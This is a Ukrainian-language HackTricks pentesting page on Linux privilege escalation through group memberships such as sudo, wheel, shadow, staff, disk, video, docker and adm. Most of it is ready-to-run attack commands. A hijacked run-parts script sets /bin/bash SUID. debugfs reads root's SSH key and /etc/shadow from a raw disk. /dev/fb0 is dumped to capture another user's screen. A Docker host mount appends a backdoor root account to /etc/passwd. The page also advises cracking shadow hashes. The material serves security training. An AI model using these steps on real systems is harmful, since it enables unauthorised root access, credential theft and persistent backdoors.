# Цікаві групи - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Групи Sudo/Admin

### **PE - Method 1**

**Іноді** політика **/etc/sudoers** системи (або файл, підключений із неї) містить такі записи:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що будь-який користувач, який відповідає будь-якому з цих записів, може виконувати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, можна просто виконати**:
```
sudo su
```
### PE - Метод 2

Знайдіть усі бінарні файли suid і перевірте, чи є серед них бінарний файл **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо **pkexec є SUID binary**, він може виконати program від імені іншого користувача лише тоді, коли polkit авторизує запитувану action; сам SUID bit не гарантує root. Перевірте встановлену policy та authorization цільової session, замість того щоб припускати, що членства в **sudo** або **admin** достатньо.<sup>[[4]](#references)[[5]](#references)</sup>

У дистрибутивах, які все ще використовують старіший Local Authority backend, перевірте його group rules за допомогою:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Назви відповідних груп і значення за замовчуванням відрізняються залежно від дистрибутива; група корисна тут лише тоді, коли її вказано в локальній політиці.<sup>[[5]](#references)</sup>

Щоб **стати root, можна виконати**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Якщо ви спробуєте виконати **pkexec** і отримаєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
В SSH-сеансі без зареєстрованого authentication agent `pkexec` може завершитися з цією помилкою, навіть якщо policy в іншому випадку дозволяла б виконання дії; polkit описує `pkttyagent` як text authentication agent для non-desktop sessions. Точна поведінка залежить від версії та дистрибутива, тому перевірте локальну policy і налаштування agent. Для деяких версій NixOS повідомляється про workaround із використанням **2 різних SSH-сесій**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Група Wheel

Іноді політика sudoers також може містити такий запис:
```
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що будь-який користувач, який відповідає цьому запису, може виконати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, достатньо виконати**:
```
sudo su
```
## Тіньова група

У системах, де дозволи це дають, користувачі групи **shadow** можуть **читати** **/etc/shadow**; перевірте фактичний режим доступу та ACL на цільовій системі:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Отже, прочитайте файл і спробуйте **crack деякі hashes**.

Важливий нюанс щодо стану блокування під час аналізу hashes:
- Записи з `!` або `*` зазвичай не підтримують інтерактивний вхід за паролем.
- `!hash` означає, що пароль було заблоковано; решта символів представляє поле пароля до його блокування.
- Поле, що містить `*`, не є дійсним hash формату `crypt(3)` і запобігає входу за UNIX-паролем; не робіть висновок із цього, чи було пароль встановлено раніше.
Це корисно для класифікації облікових записів, навіть коли прямий вхід заблоковано.<sup>[[6]](#references)</sup>

## Група Staff

**staff**: Дозволяє користувачам додавати локальні зміни до системи (`/usr/local`) без привілеїв root (зверніть увагу, що виконувані файли в `/usr/local/bin` містяться у змінній PATH будь-якого користувача та можуть "перевизначати" виконувані файли в `/bin` і `/usr/bin` з таким самим ім'ям). Порівняйте з групою "adm", яка більше пов'язана з моніторингом і безпекою.<sup>[[2]](#references)[[7]](#references)</sup>

У конфігураціях Debian, де `/usr/local/bin` розташований перед `/usr/bin` у `PATH` (як у наведених нижче прикладах), некваліфікована команда спочатку знаходить копію в `/usr/local/bin`; перевірте фактичний `PATH` на цільовій системі.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Якщо привілейований процес визначає некваліфіковану команду через доступний для запису `/usr/local/bin`, заміна цієї команди може виконати її з привілеями процесу; перед тестуванням підтвердьте фактичний шлях і умову запуску.

В системах Ubuntu `pam_motd` під час входу виконує executable scripts через `run-parts --lsbsysinit` від імені root; cron jobs також можуть використовувати `run-parts`, але це залежить від дистрибутива та конфігурації.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Під час нового входу через SSH `pspy` може допомогти підтвердити, чи справді цей шлях викликається на цільовій системі; він може спостерігати за командними рядками процесів без root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Членство в групі **disk** може надати необроблений доступ до блокових пристроїв і часто є **майже еквівалентним доступу root**; Debian описує його як здебільшого еквівалентний root, але перевірте фактичні дозволи на пристрої та структуру сховища на цільовій системі.<sup>[[7]](#references)</sup>

Поширені шляхи до пристроїв містять `/dev/sd*`, але NVMe та інші структури сховищ використовують інші назви.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` працює з файловими системами ext2/ext3/ext4; наведені вище шляхи, такі як `/root` і `/etc/shadow`, є файлами всередині відкритої файлової системи, тоді як другий аргумент `dump` є шляхом виведення у власній файловій системі.<sup>[[8]](#references)</sup> Наприклад, це витягує `/tmp/asd1.txt` з відкритої файлової системи до `/tmp/asd2.txt` у власній файловій системі:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Опція `-w` відкриває файлову систему для читання та запису, а команда `write` копіює native-файл у відкриту файлову систему. Уникайте використання цієї опції на змонтованій активній файловій системі, оскільки пряме редагування може пошкодити файлову систему; за можливості працюйте з offline-образом.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Група video

За допомогою команди `w` можна дізнатися, **хто ввійшов у систему**, і вона виведе щось на кшталт наведеного нижче.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Запис **tty1** ідентифікує першу віртуальну консоль Linux; сам по собі він не доводить фізичну присутність користувача за машиною, особливо в containers або інших середовищах.<sup>[[21]](#references)</sup>

У системах, де доступний пристрій framebuffer для читання, членство в групі **video** може надати доступ до цього пристрою. Інтерфейс Linux framebuffer описує `/dev/fb0` як доступний для читання пристрій пам’яті, вміст якого можна скопіювати для створення знімка екрана; шлях `/sys/class/graphics/fb0/virtual_size` доступний лише там, де присутній цей атрибут fbdev у sysfs, тому спочатку перевірте цільову систему.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Якщо встановлена версія **GIMP** підтримує імпортера raw-даних, відкрийте **`screen.raw`** за допомогою цього імпортера; підтримка та доступні елементи керування залежать від версії та plug-in.<sup>[[22]](#references)</sup>

![Група диска - відеогрупа: щоб відкрити raw-зображення, можна використати GIMP, вибрати файл screen.raw і вибрати тип файлу Raw image data](<../../../images/image (463).png>)

Встановіть ширину та висоту зображення відповідно до геометрії framebuffer; спробуйте доступні формати пікселів/типи зображень, доки результат не стане розбірливим.<sup>[[9]](#references)</sup>

![Група диска - відеогрупа: потім змініть ширину та висоту на ті, що використовуються на екрані, і перевірте різні типи зображень (виберіть той, який найкраще відображає екран)](<../../../images/image (317).png>)

## Група root

Членство в групі **root** не надає UID root, але файли, доступні для запису групою та належні користувачу `root`, все одно можуть бути цікавими, якщо привілейовані служби або бібліотеки використовують їх. Перевірте фактичні дозволи файлу та спосіб його використання, перш ніж розглядати його як шлях до privilege escalation.

**Перевірте, які файли можуть змінювати члени групи root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Група Docker

Членство в групі `docker` надає доступ на рівні root до Docker daemon у стандартних rootful-інсталяціях. Оскільки bind mounts за замовчуванням доступні для читання й запису, користувач, який може керувати цим daemon, може змонтувати `/` хоста в контейнер і змінювати файли хоста; фактично це надає root-доступ до хоста.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Зрештою, якщо вам не подобається жодна з наведених вище пропозицій або вони з певної причини не працюють (docker api firewall?), ви завжди можете спробувати **запустити privileged container і escape з нього**, як описано тут:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Якщо ви маєте права на запис до docker socket, прочитайте [**цей допис про те, як підвищити привілеї, зловживаючи docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Зазвичай **members** групи **`adm`** мають дозволи на **читання log**-файлів, розташованих у _/var/log/_.\
Тому, якщо ви скомпрометували користувача, який входить до цієї групи, вам безумовно слід **переглянути logs**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Ці групи мають значення, специфічні для певних сервісів і дистрибутивів. Debian описує `backup` для делегованого backup/restore, `lp` для printer daemons, а `mail` — для `/var/mail`, тому перевіряйте локальні permissions, перш ніж розглядати членство як шлях до підвищення привілеїв.<sup>[[7]](#references)</sup>

Вони часто є векторами **credential-discovery**, а не прямими шляхами до root:
- **backup**: може розкрити archives з конфігураціями, ключами, DB dumps або tokens.
- **operator**: специфічний для платформи operational access, який може leak конфіденційні runtime data.
- **lp**: print queues/spools можуть містити вміст документів.
- **mail**: mail spools можуть розкрити reset links, OTPs і внутрішні credentials.

Розглядайте членство в цих групах як finding із високою цінністю щодо витоку даних і виконуйте pivot через повторне використання passwords/tokens.

## Auth group

В OpenBSD, коли налаштовано S/Key, `/etc/skey` належить `root:auth`, а доступ до його records потребує group `auth`; records YubiKey зберігаються в `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Вразлива конфігурація OpenBSD 6.6 із увімкненим S/Key або YubiKey дозволяла локальним users із privileges групи `auth` стати root; Qualys документує prerequisite та exploit chain, а пов’язаний PoC реалізує його.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Автентифікація pkexec/pkttyagent без GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups — Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Reference Manual polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Reference Manual polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Посібник із захисту Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Пристрій Frame Buffer — документація Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Безпека Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Керування Docker як non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Запуск containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Вразливості автентифікації в OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Виділені пристрої Linux (версія 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Імпорт та експорт зображень — документація GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
